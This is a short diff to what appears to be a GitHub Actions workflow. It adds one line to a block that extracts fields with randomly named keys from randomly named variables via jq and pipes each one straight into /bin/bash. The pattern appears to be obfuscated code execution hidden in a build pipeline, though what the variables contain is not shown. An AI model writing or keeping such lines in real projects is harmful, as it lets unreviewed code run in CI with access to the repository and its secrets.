@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$d411" | jq -r .czhgf4009 | /bin/bash
           echo $fnits937 | jq -r .vurdb1 | /bin/bash
           echo $gjdua93948 | jq -r .fc8 | /bin/bash
+          echo $cuch3 | jq -r .gtz5 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
